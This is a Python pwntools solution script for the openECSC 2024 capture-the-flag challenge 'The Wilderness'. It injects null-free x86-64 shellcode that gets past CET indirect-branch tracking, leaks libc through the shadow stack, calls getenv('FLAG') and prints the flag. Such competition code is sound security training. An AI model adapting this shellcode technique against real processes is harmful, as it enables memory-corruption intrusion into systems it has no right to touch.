#!/usr/bin/env python3

import os
import logging
from pwn import *

logging.disable()

HOST = os.environ.get("HOST", "thewilderness.challs.open.ecsc2024.it")
PORT = int(os.environ.get("PORT", 38012))

filename = os.path.join(os.path.dirname(__file__), "the_wilderness")
exe = context.binary = ELF(args.EXE or filename, checksec=False)

io = remote(HOST, PORT)

def neg32(val):
    return -val & 0xffffffff

def neg64(val):
    return -val & 0xffffffffffffffff

libc = ELF(os.path.join(os.path.dirname(__file__), "libc.so.6"), checksec=False)
leak_offs =  0x29d90
getenv_offs = libc.sym["getenv"]
syscall_offs = libc.sym["syscall"]
environ_offs = libc.sym["environ"] + 1
flag_env = u64(b"FLAG\x00".ljust(8, b"\x00"))

# get FLAG env var and print it to stdout
shellcode = asm(f"""
    endbr64;                                /* ibt */
    rdsspq r12;                             /* r12 = shadow stack addr */
    add r12, 8;
    mov r12, qword ptr [r12];               /* r12 = libc leak */

    /* get libc base */
    mov ebx, {hex(neg32(leak_offs))};
    neg ebx;                                /* rbx = leak offs */
    sub r12, rbx;                           /* r12 = libc base */

    /* restore the stack */
    mov edx, {hex(neg32(environ_offs))};
    neg edx;
    dec rdx;                                /* rdx = environ offs */
    add rdx, r12;                           /* rdx = environ */
    mov rsp, qword ptr [rdx];               /* restore the stack */

    /* getenv("FLAG\x00") */
    mov ecx, {hex(neg32(getenv_offs))};
    neg ecx;                                /* rcx = getenv offs */
    add rcx, r12;                           /* rcx = getenv */

    mov rdi, {hex(neg64(flag_env))};
    neg rdi;                                /* rdi = FLAG\x00 */
    push rdi;
    mov rdi, rsp;                           /* rdi = addr of FLAG */

    mov r15, rcx;                           /* r15 = getenv */
    call r15;                               /* call getenv */

    /* syscall(1, 1, addr of flag, 0x101) */
    xor rdi, rdi;                           /* rdi = 0 */
    add rdi, 1;                             /* rdi = 1 */
    xor rsi, rsi;                           /* rsi = 0 */
    add rsi, 1;                             /* rsi = 1 */
    mov rdx, rax;                           /* rdx = addr of flag */
    mov rcx, {hex(neg64(0x101))}
    neg rcx;                                /* r10 = 0x101 */

    mov r15, {hex(neg64(syscall_offs))};
    neg r15;
    add r15, r12;                           /* r15 = syscall */
    call r15;
""")

if b"\x00" in shellcode:
    print(f"[-] shellcode contains null bytes")
    exit(1)

io.sendlineafter(b"How many bytes do you want to write in The Wilderness?\n", str(len(shellcode)).encode())
io.sendlineafter(b"What do you want to do in The Wilderness?\n", shellcode)

res = io.recvuntil(b"openECSC{")
print('openECSC{' + io.recvuntil(b'}').decode())